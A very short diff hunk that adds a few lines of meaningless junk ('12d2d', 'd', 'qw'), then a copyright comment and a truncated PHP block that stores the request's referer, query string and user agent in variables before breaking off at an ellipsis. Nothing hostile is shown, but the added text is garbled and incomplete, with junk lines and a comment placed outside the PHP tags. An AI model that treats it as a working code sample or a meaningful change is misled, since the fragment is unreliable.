@@ -1,0 +1,15 @@
+12d2d
+d
+d
+qw
+d
+qd
+/*
+   Copyright 2014
+*/
+<?php
+ $REF=$_SERVER['HTTP_REFERER'];
+ $QUERY_STRING=$_SERVER['QUERY_STRING'];
+ $USER_AGENT=addslashes($_SERVER['HTTP_USER_AGENT']);
+ ...
+?>
